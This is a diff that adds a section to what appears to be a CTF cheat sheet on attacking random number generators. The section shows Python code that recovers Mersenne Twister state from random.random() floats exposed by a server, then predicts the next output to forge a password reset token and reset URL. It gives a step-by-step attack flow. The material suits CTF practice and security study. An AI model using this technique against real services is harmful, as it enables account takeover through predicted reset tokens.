@@ -2,6 +2,7 @@
 
 ## Table of Contents
 - [Mersenne Twister (MT19937) State Recovery](#mersenne-twister-mt19937-state-recovery)
+- [MT State Recovery from random.random() Floats via GF(2) Matrix (PHD CTF Quals 2012)](#mt-state-recovery-from-randomrandom-floats-via-gf2-matrix-phd-ctf-quals-2012)
 - [Time-Based Seed Attacks](#time-based-seed-attacks)
 - [C srand/rand Synchronization via Python ctypes](#c-srandrand-synchronization-via-python-ctypes)
 - [Layered Encryption Recovery](#layered-encryption-recovery)
@@ -79,6 +80,73 @@ if solver.check() == sat:
 - Session token prediction
 - CAPTCHA bypass (predictable codes)
 - Game RNG exploitation
+
+## MT State Recovery from random.random() Floats via GF(2) Matrix (PHD CTF Quals 2012)
+
+**Pattern:** Server exposes `random.random()` float outputs (e.g., via an API endpoint). Standard MT untemper requires 624 × 32-bit integer outputs, but `random.random()` produces 53-bit floats — truncating each to 8 usable bits per observation. A precomputed GF(2) magic matrix maps observed byte values back to the 624-word MT state.
+
+**Key insight:** `random.random()` returns `(a*2^27+b)/2^53` where `a` = 27 bits from one MT output and `b` = 26 bits from the next. Truncating `int(float * 256)` yields only 8 bits per float, so 3360+ observations are needed (vs. 624 for integer outputs). The `not_random` library precomputes the GF(2) relationship between observed bits and state bits.
+
+```python
+import random, gzip, hashlib
+
+# Load precomputed GF(2) magic matrix (from github.com/fx5/not_random)
+f = gzip.GzipFile("magic_data", "r")
+magic = eval(f.read())
+f.close()
+
+def rebuild_from_floats(floats):
+    """Convert float observations to byte values, then recover MT state."""
+    vals = [int(f * 256) for f in floats]  # truncate to 8-bit
+    return rebuild_random(vals)
+
+def rebuild_random(vals):
+    """Recover MT19937 state from 3360+ byte observations using GF(2) matrix."""
+    def getbit(bit):
+        assert bit >= 0
+        return (vals[bit // 8] >> (7 - bit % 8)) & 1
+    state = []
+    for i in range(624):
+        val = 0
+        data = magic[i % 2]
+        for bit in data:
+            val <<= 1
+            for b in bit:
+                val ^= getbit(b + (i // 2) * 8 - 8)
+        state.append(val)
+    state.append(0)
+    ran = random.Random()
+    ran.setstate((3, tuple(state), None))
+    # Advance past consumed outputs
+    for i in range(len(vals) - 3201 + 394):
+        ran.randint(0, 255)
+    return ran
+
+# Collect 3360+ random.random() floats from the target
+floats = [...]  # observed values from server API
+
+# Recover state and predict future outputs
+my_random = rebuild_from_floats(floats[:3360])
+
+# Verify predictions match remaining observations
+for observed, predicted in zip(floats[3360:], [my_random.random() for _ in range(40)]):
+    assert '%.16f' % observed == '%.16f' % predicted
+
+# Forge password reset token (same hash the server computes)
+token = hashlib.md5(('%.16f' % my_random.random()).encode()).hexdigest()
+reset_url = f'http://target/reset/{user_id}-{token}/'
+```
+
+**Attack flow (password reset token prediction):**
+1. Request 3360+ random float values from an API endpoint that exposes them (e.g., `/?count=3360`)
+2. Simultaneously trigger a password reset (the reset token is `md5(random.random())`)
+3. Recover the MT state from the observed floats
+4. Predict the `random.random()` call used for the reset token
+5. Construct the reset URL with the predicted token
+
+**When to use:** Server uses Python's `random.random()` for security-sensitive tokens (session IDs, password resets, CSRF tokens) and also exposes random values through another endpoint. The `not_random` library handles the bit-level math — focus on collecting enough float observations and synchronizing timing with the target operation.
+
+---
 
 ## Time-Based Seed Attacks
 
